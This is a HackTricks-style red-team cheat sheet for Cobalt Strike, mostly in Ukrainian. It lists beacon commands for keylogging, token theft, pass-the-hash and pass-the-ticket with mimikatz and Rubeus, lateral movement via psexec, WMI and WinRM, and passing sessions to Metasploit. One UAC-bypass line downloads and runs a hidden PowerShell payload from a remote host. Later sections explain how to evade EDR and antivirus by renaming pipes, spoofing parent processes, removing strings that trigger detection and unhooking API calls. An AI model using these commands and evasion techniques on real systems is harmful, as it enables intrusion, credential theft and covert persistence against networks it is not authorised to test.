# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`, після чого ви можете вибрати, де слухати, який тип маяка використовувати (http, dns, smb...) та інше.

### Peer2Peer Listeners

Маяки цих слухачів не потребують прямого спілкування з C2, вони можуть спілкуватися з ним через інші маяки.

`Cobalt Strike -> Listeners -> Add/Edit`, після чого вам потрібно вибрати TCP або SMB маяки.

* **TCP маяк встановить слухача на вибраному порту**. Щоб підключитися до TCP маяка, використовуйте команду `connect <ip> <port>` з іншого маяка.
* **smb маяк буде слухати в pipename з вибраною назвою**. Щоб підключитися до SMB маяка, вам потрібно використовувати команду `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** для HTA файлів
* **`MS Office Macro`** для офісного документа з макросом
* **`Windows Executable`** для .exe, .dll або служби .exe
* **`Windows Executable (S)`** для **stageless** .exe, .dll або служби .exe (краще stageless, ніж staged, менше IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Це згенерує скрипт/виконуваний файл для завантаження маяка з cobalt strike у форматах, таких як: bitsadmin, exe, powershell та python.

#### Host Payloads

Якщо у вас вже є файл, який ви хочете розмістити на веб-сервері, просто перейдіть до `Attacks -> Web Drive-by -> Host File` і виберіть файл для розміщення та конфігурацію веб-сервера.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Виконати локальний .NET бінарний файл
execute-assembly </path/to/executable.exe>
# Зверніть увагу, що для завантаження збірок більше 1 МБ потрібно змінити властивість 'tasks_max_size' у змінному профілі.

# Скриншоти
printscreen    # Зробити один скриншот за допомогою методу PrintScr
screenshot     # Зробити один скриншот
screenwatch    # Зробити періодичні скриншоти робочого столу
## Перейдіть до View -> Screenshots, щоб їх побачити

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes, щоб побачити натиснуті клавіші

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Впровадити дію сканування портів у інший процес
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Імпортувати модуль Powershell
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <просто напишіть powershell cmd тут> # Це використовує найвищу підтримувану версію powershell (не oppsec)
powerpick <cmdlet> <args> # Це створює жертвенний процес, вказаний spawnto, і впроваджує UnmanagedPowerShell у нього для кращого opsec (без ведення журналу)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # Це впроваджує UnmanagedPowerShell у вказаний процес для виконання cmdlet PowerShell.

# User impersonation
## Генерація токена з обліковими даними
make_token [DOMAIN\user] [password] #Створити токен для видачі прав користувача в мережі
ls \\computer_name\c$ # Спробуйте використовувати згенерований токен для доступу до C$ на комп'ютері
rev2self # Припинити використовувати токен, згенерований за допомогою make_token
## Використання make_token генерує подію 4624: Обліковий запис успішно ввійшов. Ця подія є дуже поширеною в домені Windows, але її можна звузити, фільтруючи за типом входу. Як зазначалося вище, вона використовує LOGON32_LOGON_NEW_CREDENTIALS, що є типом 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Вкрасти токен з pid
## Як make_token, але крадучи токен з процесу
steal_token [pid] # Також це корисно для мережевих дій, а не локальних дій
## З документації API ми знаємо, що цей тип входу "дозволяє виклику клонувати свій поточний токен". Саме тому вихід Beacon говорить Impersonated <current_username> - він видає наш власний клонований токен.
ls \\computer_name\c$ # Спробуйте використовувати згенерований токен для доступу до C$ на комп'ютері
rev2self # Припинити використовувати токен з steal_token

## Запустити процес з новими обліковими даними
spawnas [domain\username] [password] [listener] #Зробіть це з каталогу з правами на читання, наприклад: cd C:\
## Як make_token, це згенерує подію Windows 4624: Обліковий запис успішно ввійшов, але з типом входу 2 (LOGON32_LOGON_INTERACTIVE). Це деталізує викликаючого користувача (TargetUserName) та користувача, якого видають (TargetOutboundUserName).

## Впровадити в процес
inject [pid] [x64|x86] [listener]
## З точки зору OpSec: Не виконуйте крос-платформенне впровадження, якщо це дійсно не потрібно (наприклад, x86 -> x64 або x64 -> x86).

## Pass the hash
## Цей процес модифікації вимагає патчування пам'яті LSASS, що є високоризиковою дією, вимагає локальних прав адміністратора і не є дуже життєздатним, якщо увімкнено Protected Process Light (PPL).
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash через mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Без /run, mimikatz запускає cmd.exe, якщо ви працюєте як користувач з робочим столом, він побачить оболонку (якщо ви працюєте як SYSTEM, ви в порядку)
steal_token <pid> #Вкрасти токен з процесу, створеного mimikatz

## Pass the ticket
## Запросити квиток
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Створити нову сесію входу для використання з новим квитком (щоб не перезаписувати скомпрометований)
make_token <domain>\<username> DummyPass
## Записати квиток на машину атакуючого з сеансу poweshell та завантажити його
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket з SYSTEM
## Згенерувати новий процес з квитком
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Вкрасти токен з цього процесу
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump interesting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## Якщо токен був створений, він буде використаний
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Використовуйте службу для запуску артефакту Service EXE
## psexec64                  x64   Використовуйте службу для запуску артефакту Service EXE
## psexec_psh                x86   Використовуйте службу для запуску однорядкового скрипту PowerShell
## winrm                     x86   Запустіть скрипт PowerShell через WinRM
## winrm64                   x64   Запустіть скрипт PowerShell через WinRM
## wmi_msbuild               x64   wmi бічний рух з msbuild вбудованим завданням c# (oppsec)

remote-exec [method] [target] [command] # remote-exec не повертає виходу
## Methods:
## psexec                          Віддалене виконання через Менеджер керування службами
## winrm                           Віддалене виконання через WinRM (PowerShell)
## wmi                             Віддалене виконання через WMI

## Щоб виконати маяк з wmi (це не в команді jump), просто завантажте маяк і виконайте його
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe

# Pass session to Metasploit - Через слухача
## На хості metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## На cobalt: Слухачі > Додати та встановити Payload на Foreign HTTP. Встановіть Host на 10.10.5.120, Port на 8080 та натисніть Зберегти.
beacon> spawn metasploit
## Ви можете запускати лише x86 сесії Meterpreter з іноземним слухачем.

# Pass session to Metasploit - Через ін'єкцію shellcode
## На хості metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Запустіть msfvenom і підготуйте слухача multi/handler

## Скопіюйте бінарний файл на хост cobalt strike
ps
shinject <pid> x64 C:\Payloads\msf.bin #Впровадьте shellcode metasploit у процес x64

# Pass metasploit session to cobalt strike
## Згенеруйте stageless Beacon shellcode, перейдіть до Attacks > Packages > Windows Executable (S), виберіть бажаний слухач, виберіть Raw як тип виходу та виберіть Використовувати x64 payload.
## Використовуйте post/windows/manage/shellcode_inject у metasploit для впровадження згенерованого shellcode cobalt strike.

# Pivoting
## Відкрийте проксі-сервер socks на teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Execute-Assembly

**`execute-assembly`** використовує **жертвенний процес**, використовуючи віддалену ін'єкцію процесу для виконання вказаної програми. Це дуже шумно, оскільки для впровадження в процес використовуються певні Win API, які перевіряє кожен EDR. Однак є деякі спеціальні інструменти, які можна використовувати для завантаження чогось в той же процес:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- У Cobalt Strike ви також можете використовувати BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

Скрипт агресора `https://github.com/outflanknl/HelpColor` створить команду `helpx` у Cobalt Strike, яка додасть кольори до команд, вказуючи, чи це BOFs (зелений), чи це Frok&Run (жовтий) і подібне, або якщо це ProcessExecution, ін'єкція або подібне (червоний). Це допомагає знати, які команди є більш прихованими.

### Act as the user

Ви можете перевірити події, такі як `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Перевірте всі інтерактивні входи, щоб дізнатися звичайні години роботи.
- System EID 12,13 - Перевірте частоту вимкнення/включення/сну.
- Security EID 4624/4625 - Перевірте вхідні дійсні/недійсні спроби NTLM.
- Security EID 4648 - Ця подія створюється, коли для входу використовуються відкриті облікові дані. Якщо процес її згенерував, бінарний файл потенційно має облікові дані у відкритому вигляді в конфігураційному файлі або в коді.

Коли ви використовуєте `jump` з cobalt strike, краще використовувати метод `wmi_msbuild`, щоб новий процес виглядав більш легітимно.

### Use computer accounts

Зазвичай захисники перевіряють дивну поведінку, що генерується користувачами, і **виключають облікові записи служб і комп'ютерів, такі як `*$`, з їх моніторингу**. Ви можете використовувати ці облікові записи для виконання бічного руху або підвищення привілеїв.

### Use stageless payloads

Stageless payloads менш шумні, ніж staged, оскільки їм не потрібно завантажувати другий етап з сервера C2. Це означає, що вони не генерують жодного мережевого трафіку після початкового з'єднання, що робить їх менш імовірними для виявлення мережевими засобами захисту.

### Tokens & Token Store

Будьте обережні, коли ви крадете або генеруєте токени, оскільки може бути можливим для EDR перерахувати всі токени всіх потоків і знайти **токен, що належить іншому користувачу** або навіть SYSTEM у процесі.

Це дозволяє зберігати токени **по маяку**, тому немає потреби красти один і той же токен знову і знову. Це корисно для бічного руху або коли вам потрібно використовувати вкрадений токен кілька разів:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

При бічному русі зазвичай краще **вкрасти токен, ніж генерувати новий** або виконувати атаку pass the hash.

### Guardrails

Cobalt Strike має функцію під назвою **Guardrails**, яка допомагає запобігти використанню певних команд або дій, які можуть бути виявлені захисниками. Guardrails можна налаштувати для блокування конкретних команд, таких як `make_token`, `jump`, `remote-exec` та інших, які зазвичай використовуються для бічного руху або підвищення привілеїв.

Більше того, репозиторій [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) також містить деякі перевірки та ідеї, які ви могли б розглянути перед виконанням payload.

### Tickets encryption

У AD будьте обережні з шифруванням квитків. За замовчуванням деякі інструменти використовують шифрування RC4 для квитків Kerberos, яке є менш безпечним, ніж шифрування AES, і за замовчуванням сучасні середовища використовують AES. Це може бути виявлено захисниками, які моніторять слабкі алгоритми шифрування.

### Avoid Defaults

При використанні Cobalt Strike за замовчуванням SMB труби матимуть назву `msagent_####` та `"status_####`. Змініть ці назви. Можна перевірити назви існуючих труб з Cobalt Strike за допомогою команди: `ls \\.\pipe\`

Більше того, з SSH-сесіями створюється труба під назвою `\\.\pipe\postex_ssh_####`. Змініть її на `set ssh_pipename "<new_name>";`.

Також в атаці постексплуатації труби `\\.\pipe\postex_####` можна змінити за допомогою `set pipename "<new_name>"`.

У профілях Cobalt Strike ви також можете змінити такі речі, як:

- Уникнення використання `rwx`
- Як працює поведінка ін'єкції процесу (які API будуть використані) в блоці `process-inject {...}`
- Як працює "fork and run" в блоці `post-ex {…}`
- Час сну
- Максимальний розмір бінарних файлів, які потрібно завантажити в пам'ять
- Обсяг пам'яті та вміст DLL з блоком `stage {...}`
- Мережевий трафік

### Bypass memory scanning

Деякі EDR сканують пам'ять на наявність деяких відомих підписів шкідливого ПЗ. Cobalt Strike дозволяє модифікувати функцію `sleep_mask` як BOF, яка зможе зашифрувати в пам'яті бекдор.

### Noisy proc injections

Коли ви впроваджуєте код у процес, це зазвичай дуже шумно, оскільки **жоден звичайний процес зазвичай не виконує цю дію, і способи зробити це дуже обмежені**. Тому це може бути виявлено системами виявлення на основі поведінки. Більше того, це також може бути виявлено EDR, які сканують мережу на **потоки, що містять код, який не знаходиться на диску** (хоча процеси, такі як браузери, які використовують JIT, мають це зазвичай). Приклад: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

При створенні нового процесу важливо **підтримувати звичайні батьківсько-дитячі** відносини між процесами, щоб уникнути виявлення. Якщо svchost.exec виконує iexplorer.exe, це виглядатиме підозріло, оскільки svchost.exe не є батьком iexplorer.exe в нормальному середовищі Windows.

Коли новий маяк створюється в Cobalt Strike, за замовчуванням створюється процес, що використовує **`rundll32.exe`**, щоб запустити новий слухач. Це не дуже приховано і може бути легко виявлено EDR. Більше того, `rundll32.exe` запускається без будь-яких аргументів, що робить його ще більш підозрілим.

З наступною командою Cobalt Strike ви можете вказати інший процес для створення нового маяка, що робить його менш виявленим:
```bash
spawnto x86 svchost.exe
```
Ви також можете змінити цю настройку **`spawnto_x86` та `spawnto_x64`** в профілі.

### Проксіювання трафіку атакуючих

Атакуючі іноді повинні мати можливість запускати інструменти локально, навіть на машинах з linux, і забезпечити, щоб трафік жертв досягав інструменту (наприклад, NTLM relay).

Більше того, іноді для виконання атаки pass-the-hash або pass-the-ticket для атакуючого буде непомітніше **додати цей хеш або квиток у свій власний процес LSASS** локально, а потім здійснити півот з нього, замість того щоб модифікувати процес LSASS жертви.

Однак вам потрібно бути **обережним з генерованим трафіком**, оскільки ви можете надсилати незвичний трафік (kerberos?) з вашого процесу бекдору. Для цього ви могли б здійснити півот до процесу браузера (хоча ви можете бути спіймані, якщо будете інжектувати себе в процес, тому подумайте про непомітний спосіб зробити це).
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> Змінити пароль  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Змінити powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Змінити $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```


{{#include ../banners/hacktricks-training.md}}
